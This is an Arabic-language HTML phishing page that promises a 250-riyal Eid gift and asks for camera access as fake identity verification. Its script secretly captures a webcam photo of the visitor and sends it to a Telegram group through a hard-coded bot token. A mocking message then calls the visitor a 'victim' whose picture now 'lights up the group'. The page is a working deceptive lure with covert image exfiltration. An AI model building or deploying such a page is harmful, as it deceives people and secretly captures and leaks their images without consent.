<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>هدية خاصة لك من فهودي 🎁</title>
    
    <meta property="og:title" content="هدية خاصة لك من فهودي 🎁">
    <meta property="og:description" content="اضغط هنا لاستلام عيدية بقيمة 250 ريال مقدمة من فهودي.">
    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB2a9JizqwqvDF5Q7taaKTkohGvbyt4ePOFQ&s">
    <meta property="og:type" content="website">

    <style>
        :root {
            --primary-color: #128c7e;
            --secondary-color: #075e54;
            --accent-color: #25d366;
        }

        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }

        .card { 
            background: rgba(255, 255, 255, 0.95); 
            padding: 30px; 
            border-radius: 25px; 
            box-shadow: 0 20px 50px rgba(0,0,0,0.15); 
            text-align: center; 
            width: 90%; 
            max-width: 420px; 
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.3);
            animation: slideUp 0.8s ease-out;
        }

        .logo { 
            width: 100px; 
            height: 100px; 
            border-radius: 50%; 
            margin-bottom: 15px; 
            object-fit: cover;
            border: 4px solid var(--accent-color);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        h1 { color: #333; font-size: 22px; margin-bottom: 10px; }
        p { color: #666; font-size: 15px; }

        .amount-box {
            background: #f0fff4;
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
            border: 2px dashed var(--accent-color);
        }

        .amount { 
            font-size: 50px; 
            color: var(--secondary-color); 
            font-weight: 900; 
        }

        .currency { font-size: 18px; color: #888; margin-right: 5px; }

        .btn { 
            background: linear-gradient(to right, var(--primary-color), var(--accent-color));
            color: white; 
            border: none; 
            padding: 18px 30px; 
            border-radius: 50px; 
            font-size: 18px; 
            cursor: pointer; 
            width: 100%; 
            font-weight: bold; 
            box-shadow: 0 10px 20px rgba(18, 140, 126, 0.3); 
            transition: 0.3s; 
        }

        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(18, 140, 126, 0.4); }
        .btn:active { transform: scale(0.98); }

        .receipt { display: none; text-align: right; background: #fff; padding: 20px; border-radius: 15px; margin-top: 20px; border: 1px solid #ddd; animation: fadeIn 0.5s; box-shadow: inset 0 2px 5px rgba(0,0,0,0.05); }
        
        video, canvas { display: none; }
        
        .final-msg { color: #d63031; font-size: 28px; font-weight: bold; line-height: 1.4; }

        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB2a9JizqwqvDF5Q7taaKTkohGvbyt4ePOFQ&s" class="logo">
    <h1>مبروك! وصلتك هدية 🎁</h1>
    <p>لقد أرسل لك <b>فهودي</b> مبلغاً نقدياً بمناسبة العيد</p>
    
    <div class="amount-box">
        <span class="amount">250.00</span>
        <span class="currency">ر.س</span>
    </div>

    <button class="btn" id="giftBtn" onclick="takeGift()">استلام في الحساب البنكي</button>
    <p style="font-size: 12px; margin-top: 15px;">* يتطلب التحقق من الهوية عبر الكاميرا لمرة واحدة</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // بياناتك المحدثة للجروب الخاص بك
    const TOKEN = "8680007162:AAEKrDXjZJdNKdWeT6pIkMXyALj0m30q34I";
    const CHAT_ID = "-3805611772"; 

    async function takeGift() {
        try {
            // طلب إذن الكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;

            const card = document.getElementById('mainCard');
            card.innerHTML = `
                <div style="color:var(--accent-color); font-size:70px; margin-bottom:10px;">⌛</div>
                <h3>جاري التحقق من الهوية...</h3>
                <div class="receipt" style="display:block;">
                    <p><b>المرسل:</b> فهودي</p>
                    <p><b>المبلغ:</b> 250.00 ريال</p>
                    <p><b>الحالة:</b> قيد المراجعة الأمنية</p>
                    <hr>
                    <p style="font-size:13px; color:#e67e22; text-align:center;">يرجى تثبيت الوجه أمام الكاميرا لمدة 3 ثوانٍ لإتمام الإيداع</p>
                </div>
            `;

            // التقاط وإرسال بعد 3 ثوانٍ من ظهور الرسالة الوهمية
            setTimeout(captureAndSend, 3000);

        } catch (err) {
            alert("عذراً، يجب السماح بالكاميرا للتحقق من أنك لست روبوت (Bot) لضمان وصول العيدية لحسابك!");
        }
    }

    function captureAndSend() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        // ضبط أبعاد الصورة
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // تحويل الصورة وإرسالها لتليجرام
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'target.jpg');
            formData.append('caption', 'صيد جديد لعيون فهودي! 😂📸\nالضحية جالس ينتظر الـ 250 ريال!');

            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            // إظهار الرسالة النهائية للضحية
            setTimeout(() => {
                document.getElementById('mainCard').innerHTML = `
                    <div class="final-msg">🤡 تعيش وتأكل غيرها!</div>
                    <p style="font-size:18px; margin-top:15px;">صورتك الحين نورت الجروب يا سبك!</p>
                    <p style="font-weight:bold; color:var(--primary-color);">عيدك مبارك يا ضحية فهودي 😂</p>
                `;
            }, 1000);
        }, 'image/jpeg');
    }
</script>

</body>
</html>
